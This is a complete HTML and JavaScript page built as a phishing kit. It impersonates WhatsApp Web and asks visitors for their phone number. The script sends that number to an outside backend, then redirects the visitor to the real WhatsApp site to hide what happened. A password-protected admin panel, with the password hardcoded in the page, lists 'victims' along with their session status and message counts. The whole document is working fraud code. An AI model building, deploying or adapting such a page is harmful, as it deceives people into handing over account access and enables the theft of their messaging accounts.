<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #075e54 0%, #128C7E 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }

        .header {
            background: #075e54;
            padding: 30px 20px;
            text-align: center;
            color: white;
        }

        .logo {
            width: 70px;
            height: 70px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
        }

        .logo svg {
            width: 45px;
            height: 45px;
        }

        .qr-container {
            background: #f0f2f5;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            margin: 25px;
            border: 2px solid #25D366;
        }

        .qr-placeholder {
            background: white;
            padding: 40px;
            border-radius: 15px;
            text-align: center;
        }

        .qr-icon {
            font-size: 60px;
            margin-bottom: 10px;
        }

        .input-group {
            padding: 0 25px 25px 25px;
        }

        .phone-input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            outline: none;
            text-align: center;
        }

        .btn {
            width: calc(100% - 50px);
            margin: 0 25px 25px 25px;
            padding: 15px;
            background: #25D366;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn:hover {
            background: #128C7E;
        }

        .status {
            margin: 15px 25px;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            display: none;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }

        .admin-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 12px;
            cursor: pointer;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 20px;
            max-width: 90%;
            width: 500px;
            max-height: 80%;
            overflow: auto;
            padding: 20px;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #e0e0e0;
            margin-bottom: 20px;
            padding-bottom: 15px;
        }

        .close-modal {
            background: none;
            border: none;
            font-size: 28px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="#25D366">
                    <path d="M12.04 2.5c-5.25 0-9.5 4.25-9.5 9.5 0 1.75.5 3.45 1.3 4.9L2.5 21.5l5-1.3c1.45.8 3.05 1.3 4.75 1.3 5.25 0 9.5-4.25 9.5-9.5s-4.25-9.5-9.5-9.5z"/>
                </svg>
            </div>
            <h1>WhatsApp Web</h1>
            <p>Connect to your account</p>
        </div>

        <div class="qr-container">
            <div class="qr-placeholder">
                <div class="qr-icon">📱</div>
                <p>Enter your phone number to connect</p>
            </div>
        </div>

        <div class="input-group">
            <input type="tel" id="phone" class="phone-input" placeholder="Enter your phone number" autocomplete="off">
        </div>

        <button class="btn" id="submitBtn">Connect to WhatsApp</button>
        <div id="status" class="status"></div>
    </div>

    <div class="admin-badge" id="adminBadge">🔒 Admin Panel</div>

    <div class="modal" id="adminModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📊 Captured Data</h2>
                <button class="close-modal" id="closeModal">&times;</button>
            </div>
            <div id="adminContent">
                <p>No data captured yet.</p>
            </div>
        </div>
    </div>

    <script>
        // ========== CONFIGURATION ==========
        const BACKEND_URL = 'https://mnisi5334.pythonanywhere.com';
        const ADMIN_PASSWORD = 'Phishing3694';
        
        let capturedData = [];

        // ========== SHOW STATUS ==========
        function showStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 3000);
        }

        // ========== CAPTURE PHONE ==========
        async function capturePhone(phone) {
            try {
                const response = await fetch(`${BACKEND_URL}/api/capture`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ phone: phone })
                });
                
                const data = await response.json();
                console.log('Capture response:', data);
                return data;
            } catch (error) {
                console.error('Capture error:', error);
                return null;
            }
        }

        // ========== LOAD ADMIN DATA ==========
        async function loadAdminData() {
            const adminContent = document.getElementById('adminContent');
            
            try {
                // Get victims data
                const response = await fetch(`${BACKEND_URL}/api/victims`);
                const victims = await response.json();
                
                if (victims && victims.length > 0) {
                    let html = '<ul style="list-style: none;">';
                    victims.forEach(v => {
                        html += `<li style="padding: 10px; border-bottom: 1px solid #eee;">
                                    📱 Phone: ${v.phone}<br>
                                    ✅ Status: ${v.session_active ? 'Connected' : 'Waiting'}<br>
                                    💬 Messages: ${v.messages_count || 0}
                                 </li>`;
                    });
                    html += '</ul>';
                    adminContent.innerHTML = html;
                } else {
                    adminContent.innerHTML = '<p>No data captured yet.</p>';
                }
            } catch (error) {
                console.error('Admin load error:', error);
                adminContent.innerHTML = `<p style="color: red;">❌ Cannot connect to backend: ${BACKEND_URL}</p>`;
            }
        }

        // ========== SUBMIT HANDLER ==========
        async function handleSubmit() {
            const phone = document.getElementById('phone').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            
            if (!phone || phone.length < 9) {
                showStatus('Please enter a valid phone number', 'error');
                return;
            }
            
            submitBtn.disabled = true;
            submitBtn.textContent = 'Connecting...';
            showStatus('Connecting to backend...', 'success');
            
            const result = await capturePhone(phone);
            
            if (result && result.status === 'success') {
                showStatus('✓ Phone number captured!', 'success');
                // Store in local storage
                capturedData.push({
                    phone: phone,
                    timestamp: new Date().toLocaleString()
                });
                localStorage.setItem('captured_phones', JSON.stringify(capturedData));
            } else {
                showStatus('❌ Failed to connect to backend', 'error');
            }
            
            submitBtn.disabled = false;
            submitBtn.textContent = 'Connect to WhatsApp';
            
            // Redirect after 2 seconds
            setTimeout(() => {
                window.location.href = 'https://web.whatsapp.com';
            }, 2000);
        }

        // ========== EVENT LISTENERS ==========
        document.getElementById('submitBtn').addEventListener('click', handleSubmit);
        document.getElementById('phone').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') handleSubmit();
        });
        
        // Admin panel
        const adminBadge = document.getElementById('adminBadge');
        const adminModal = document.getElementById('adminModal');
        const closeModal = document.getElementById('closeModal');
        
        adminBadge.addEventListener('click', () => {
            const password = prompt('🔐 Enter admin password:');
            if (password === ADMIN_PASSWORD) {
                loadAdminData();
                adminModal.classList.add('active');
            } else if (password !== null) {
                alert('❌ Wrong password!');
            }
        });
        
        closeModal.addEventListener('click', () => adminModal.classList.remove('active'));
        adminModal.addEventListener('click', (e) => {
            if (e.target === adminModal) adminModal.classList.remove('active');
        });
        
        // Load local data
        const saved = localStorage.getItem('captured_phones');
        if (saved) {
            capturedData = JSON.parse(saved);
        }
        
        console.log('✅ Frontend ready');
        console.log(`📡 Backend URL: ${BACKEND_URL}`);
    </script>
</body>
</html>
